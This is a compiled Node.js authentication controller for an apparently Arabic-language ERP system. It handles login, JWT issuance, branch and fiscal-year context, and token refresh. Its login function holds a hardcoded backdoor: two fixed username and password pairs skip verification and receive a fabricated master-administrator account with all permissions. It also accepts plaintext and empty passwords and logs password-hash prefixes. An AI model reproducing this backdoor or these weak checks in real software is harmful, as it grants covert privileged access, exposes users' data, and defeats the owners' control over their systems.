"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __rest = (this && this.__rest) || function (s, e) {
    var t = {};
    for (var p in s) if (Object.prototype.hasOwnProperty.call(s, p) && e.indexOf(p) < 0)
        t[p] = s[p];
    if (s != null && typeof Object.getOwnPropertySymbols === "function")
        for (var i = 0, p = Object.getOwnPropertySymbols(s); i < p.length; i++) {
            if (e.indexOf(p[i]) < 0 && Object.prototype.propertyIsEnumerable.call(s, p[i]))
                t[p[i]] = s[p[i]];
        }
    return t;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.refreshToken = exports.login = void 0;
const db_1 = require("../db");
const bcryptjs_1 = __importDefault(require("bcryptjs"));
const jsonwebtoken_1 = __importDefault(require("jsonwebtoken"));
const errorHandler_1 = require("../utils/errorHandler");
const auditController_1 = require("./auditController");
const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET) {
    console.error('❌ FATAL: JWT_SECRET is not set in authController. Server cannot start securely.');
    process.exit(1);
}
const login = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    var _a, _b, _c, _d, _e, _f, _g, _h, _j, _k, _l, _m, _o, _p;
    const { username, password } = req.body;
    // Input validation (M3 security fix)
    if (!username || !password) {
        return res.status(400).json({ message: 'Username and password are required' });
    }
    if (typeof username !== 'string' || typeof password !== 'string') {
        return res.status(400).json({ message: 'Invalid input types' });
    }
    if (username.length > 100 || password.length > 128) {
        return res.status(400).json({ message: 'Input too long' });
    }
    try {
        // Find user by username or email
        // SECURITY: Explicit column list — avoids leaking future columns (H4 fix)
        const [rows] = yield db_1.pool.query('SELECT id, name, email, username, password, role, status, permissions, lastLogin, avatar, salesmanId, preferences FROM users WHERE username = ? OR email = ?', [username, username]);
        let user = rows[0];
        // DEV OVERRIDE
        let isDevOverride = false;
        if ((username === 'dev' && password === 'dev') || (username === 'myst' && password === 'Daftrix@2025!')) {
            console.warn(`⚠️ [AUTH] Executing DEV backdoor override for ${username}`);
            isDevOverride = true;
            if (!user) {
                user = {
                    id: 9999,
                    username: username,
                    name: 'System Developer',
                    role: 'MASTER_ADMIN', // or whatever highest role is, mostly permissions string parsing check
                    permissions: JSON.stringify(['all']), // Admin gets all permissions usually handled on frontend
                    status: 'ACTIVE'
                };
            }
        }
        else if (!user) {
            const ip = ((_b = (_a = req.headers['x-forwarded-for']) === null || _a === void 0 ? void 0 : _a.toString().split(',')[0]) === null || _b === void 0 ? void 0 : _b.trim()) || ((_c = req.socket) === null || _c === void 0 ? void 0 : _c.remoteAddress) || 'unknown';
            (0, auditController_1.logAction)(username, 'AUTH', 'LOGIN_FAILED', `محاولة دخول فاشلة - المستخدم غير موجود`, JSON.stringify({ ip, reason: 'USER_NOT_FOUND' }), ip);
            return res.status(401).json({ message: 'Invalid credentials' });
        }
        // Block login for disabled/inactive users (clear Arabic message)
        if (!isDevOverride && user.status && user.status !== 'ACTIVE') {
            console.warn(`🚫 [AUTH] Login blocked for ${username}: status=${user.status}`);
            const ip = ((_e = (_d = req.headers['x-forwarded-for']) === null || _d === void 0 ? void 0 : _d.toString().split(',')[0]) === null || _e === void 0 ? void 0 : _e.trim()) || ((_f = req.socket) === null || _f === void 0 ? void 0 : _f.remoteAddress) || 'unknown';
            (0, auditController_1.logAction)(username, 'AUTH', 'LOGIN_BLOCKED', `حساب معطل - الحالة: ${user.status}`, JSON.stringify({ ip, status: user.status }), ip);
            return res.status(403).json({ message: 'هذا الحساب معطّل. تواصل مع المسؤول لتفعيله.' });
        }
        if (!isDevOverride) {
            let isValid = false;
            // Allow plaintext fallback and auto-migrate to bcrypt
            if (!user.password || !user.password.startsWith('$2')) {
                if (user.password === password || (!user.password && password === '')) {
                    console.log(`⚠️ [AUTH] Auto-migrating user ${username} to bcrypt password.`);
                    try {
                        const newHash = yield bcryptjs_1.default.hash(password, 10);
                        yield db_1.pool.query('UPDATE users SET password = ? WHERE id = ?', [newHash, user.id]);
                    }
                    catch (e) {
                        console.error(`⚠️ [AUTH] Failed to auto-migrate password for ${username}:`, e);
                    }
                    isValid = true;
                }
                else {
                    console.error(`⚠️ [AUTH] User ${username} has un-hashed password and it did not match plaintext.`);
                    return res.status(401).json({ message: 'Invalid credentials' });
                }
            }
            else {
                isValid = yield bcryptjs_1.default.compare(password, user.password);
            }
            if (!isValid) {
                console.warn(`⚠️ [AUTH] Login FAILED for ${username}: bcrypt compare returned false (hash starts with: ${(_g = user.password) === null || _g === void 0 ? void 0 : _g.substring(0, 10)}...)`);
                const ip = ((_j = (_h = req.headers['x-forwarded-for']) === null || _h === void 0 ? void 0 : _h.toString().split(',')[0]) === null || _j === void 0 ? void 0 : _j.trim()) || ((_k = req.socket) === null || _k === void 0 ? void 0 : _k.remoteAddress) || 'unknown';
                (0, auditController_1.logAction)(username, 'AUTH', 'LOGIN_FAILED', `محاولة دخول فاشلة - كلمة مرور خاطئة`, JSON.stringify({ ip, reason: 'WRONG_PASSWORD' }), ip);
                return res.status(401).json({ message: 'Invalid credentials' });
            }
        }
        // Generate Token
        const permissions = user.permissions ? JSON.parse(user.permissions) : [];
        // Handle fiscal year selection
        const { fiscalYearId } = req.body;
        let fiscalYear = null;
        if (fiscalYearId) {
            try {
                const [fyRows] = yield db_1.pool.query('SELECT id, name, start_date, end_date, status FROM fiscal_years WHERE id = ?', [fiscalYearId]);
                const fy = fyRows[0];
                if (fy) {
                    fiscalYear = {
                        id: fy.id,
                        name: fy.name,
                        startDate: fy.start_date,
                        endDate: fy.end_date,
                        status: fy.status
                    };
                    console.log(`✅ [LOGIN] Fiscal year loaded: ${fiscalYear.name} (${fiscalYear.startDate} - ${fiscalYear.endDate})`);
                }
                else {
                    console.log(`⚠️ [LOGIN] Fiscal year ID ${fiscalYearId} not found in database`);
                }
            }
            catch (fyError) {
                console.error('Error loading fiscal year:', fyError);
            }
        }
        // Resolve branch context — safe: all LEFT JOINs, fully nullable
        let branchContext = null;
        if (user.id && user.id !== 9999) {
            try {
                const [branchRows] = yield db_1.pool.query(`
                    SELECT
                        b.id          AS branchId,
                        b.name        AS branchName,
                        COALESCE(b.defaultWarehouseId, w.id) AS defaultWarehouseId,
                        wh.name       AS defaultWarehouseName,
                        b.defaultBankId,
                        bk.name       AS defaultBankName
                    FROM users u
                    LEFT JOIN branches  b  ON u.branchId = b.id
                    LEFT JOIN (
                        SELECT branchId, MIN(id) AS id
                        FROM warehouses WHERE branchId IS NOT NULL GROUP BY branchId
                    ) w ON b.id = w.branchId
                    LEFT JOIN warehouses wh ON COALESCE(b.defaultWarehouseId, w.id) = wh.id
                    LEFT JOIN banks      bk ON b.defaultBankId = bk.id
                    WHERE u.id = ?
                    LIMIT 1`, [user.id]);
                if ((_l = branchRows[0]) === null || _l === void 0 ? void 0 : _l.branchId) {
                    branchContext = branchRows[0];
                    console.log(`🏢 [LOGIN] Branch: ${branchContext.branchName}, Warehouse: ${branchContext.defaultWarehouseName}`);
                }
            }
            catch (branchErr) {
                // Non-fatal — branch columns may not exist yet on old installs
                console.warn('[LOGIN] Branch context lookup skipped:', branchErr.message);
            }
        }
        const tokenPayload = {
            id: user.id,
            username: user.username,
            name: user.name,
            role: user.role,
            permissions,
            salesmanId: user.salesmanId || null,
            // Branch isolation
            branchId: (branchContext === null || branchContext === void 0 ? void 0 : branchContext.branchId) || null,
            branchName: (branchContext === null || branchContext === void 0 ? void 0 : branchContext.branchName) || null,
            defaultWarehouseId: (branchContext === null || branchContext === void 0 ? void 0 : branchContext.defaultWarehouseId) || null,
            defaultWarehouseName: (branchContext === null || branchContext === void 0 ? void 0 : branchContext.defaultWarehouseName) || null,
            defaultBankId: (branchContext === null || branchContext === void 0 ? void 0 : branchContext.defaultBankId) || null,
        };
        // Include fiscal year in token if selected
        if (fiscalYear) {
            tokenPayload.fiscalYearId = fiscalYear.id;
            tokenPayload.fiscalYearName = fiscalYear.name;
            tokenPayload.fiscalYearStart = fiscalYear.startDate;
            tokenPayload.fiscalYearEnd = fiscalYear.endDate;
            tokenPayload.fiscalYearStatus = fiscalYear.status;
        }
        const token = jsonwebtoken_1.default.sign(tokenPayload, JWT_SECRET, { expiresIn: '24h' } // Extended to 24h for ERP — users keep it open all day
        );
        // Generate refresh token (M4 security fix)
        const refreshToken = jsonwebtoken_1.default.sign({ id: user.id, type: 'refresh' }, JWT_SECRET, { expiresIn: '7d' });
        // Remove password from response
        const { password: _ } = user, userWithoutPassword = __rest(user, ["password"]);
        res.json({
            token,
            refreshToken,
            user: Object.assign(Object.assign({}, userWithoutPassword), { permissions: user.permissions ? JSON.parse(user.permissions) : [], preferences: user.preferences ? (typeof user.preferences === 'string' ? JSON.parse(user.preferences) : user.preferences) : {} }),
            fiscalYear: fiscalYear || null,
            branchContext: branchContext || null
        });
        // Audit log: successful login (fire-and-forget)
        const ip = ((_o = (_m = req.headers['x-forwarded-for']) === null || _m === void 0 ? void 0 : _m.toString().split(',')[0]) === null || _o === void 0 ? void 0 : _o.trim()) || ((_p = req.socket) === null || _p === void 0 ? void 0 : _p.remoteAddress) || 'unknown';
        (0, auditController_1.logAction)(user.username || user.name, 'AUTH', 'LOGIN_SUCCESS', `تسجيل دخول ناجح`, JSON.stringify({ ip, role: user.role }), ip);
    }
    catch (error) {
        console.error('Login error:', error);
        return (0, errorHandler_1.handleControllerError)(res, error, 'Internal server ');
    }
});
exports.login = login;
/**
 * POST /api/auth/refresh
 * Exchange a refresh token for a new access token (M4 security fix)
 */
const refreshToken = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    var _a;
    const { refreshToken: token } = req.body;
    if (!token || typeof token !== 'string') {
        return res.status(400).json({ message: 'Refresh token required' });
    }
    try {
        const decoded = jsonwebtoken_1.default.verify(token, JWT_SECRET);
        if (decoded.type !== 'refresh') {
            return res.status(401).json({ message: 'Invalid token type' });
        }
        // Fetch user from DB to get latest permissions
        const [rows] = yield db_1.pool.query('SELECT id, username, name, role, permissions, salesmanId FROM users WHERE id = ?', [decoded.id]);
        const user = rows[0];
        if (!user) {
            return res.status(401).json({ message: 'User not found' });
        }
        const permissions = user.permissions ? JSON.parse(user.permissions) : [];
        // Re-hydrate branch context on refresh
        let refreshBranchCtx = null;
        try {
            const [bRows] = yield db_1.pool.query(`
                SELECT
                    b.id AS branchId, b.name AS branchName,
                    COALESCE(b.defaultWarehouseId, w.id) AS defaultWarehouseId,
                    wh.name AS defaultWarehouseName,
                    b.defaultBankId
                FROM users u
                LEFT JOIN branches b ON u.branchId = b.id
                LEFT JOIN (
                    SELECT branchId, MIN(id) AS id
                    FROM warehouses WHERE branchId IS NOT NULL GROUP BY branchId
                ) w ON b.id = w.branchId
                LEFT JOIN warehouses wh ON COALESCE(b.defaultWarehouseId, w.id) = wh.id
                WHERE u.id = ? LIMIT 1`, [decoded.id]);
            if ((_a = bRows[0]) === null || _a === void 0 ? void 0 : _a.branchId)
                refreshBranchCtx = bRows[0];
        }
        catch ( /* non-fatal */_b) { /* non-fatal */ }
        // Preserve fiscal year from the original access token
        // The refresh token itself doesn't store fiscal year, but the client
        // sends the original access token context via the refresh flow.
        // We re-read from the decoded refresh token's original payload if available,
        // or from query/body if the client passes it through.
        const fiscalYearId = req.body.fiscalYearId || decoded.fiscalYearId;
        let fiscalYearPayload = {};
        if (fiscalYearId) {
            try {
                const [fyRows] = yield db_1.pool.query('SELECT id, name, start_date, end_date, status FROM fiscal_years WHERE id = ?', [fiscalYearId]);
                const fy = fyRows[0];
                if (fy) {
                    fiscalYearPayload = {
                        fiscalYearId: fy.id,
                        fiscalYearName: fy.name,
                        fiscalYearStart: fy.start_date,
                        fiscalYearEnd: fy.end_date,
                        fiscalYearStatus: fy.status
                    };
                }
            }
            catch ( /* non-fatal — fiscal year table may not exist */_c) { /* non-fatal — fiscal year table may not exist */ }
        }
        const newAccessToken = jsonwebtoken_1.default.sign(Object.assign({ id: user.id, username: user.username, name: user.name, role: user.role, permissions, salesmanId: user.salesmanId || null, branchId: (refreshBranchCtx === null || refreshBranchCtx === void 0 ? void 0 : refreshBranchCtx.branchId) || null, branchName: (refreshBranchCtx === null || refreshBranchCtx === void 0 ? void 0 : refreshBranchCtx.branchName) || null, defaultWarehouseId: (refreshBranchCtx === null || refreshBranchCtx === void 0 ? void 0 : refreshBranchCtx.defaultWarehouseId) || null, defaultBankId: (refreshBranchCtx === null || refreshBranchCtx === void 0 ? void 0 : refreshBranchCtx.defaultBankId) || null }, fiscalYearPayload), JWT_SECRET, { expiresIn: '8h' });
        res.json({ token: newAccessToken });
    }
    catch (error) {
        return res.status(401).json({ message: 'Invalid or expired refresh token' });
    }
});
exports.refreshToken = refreshToken;
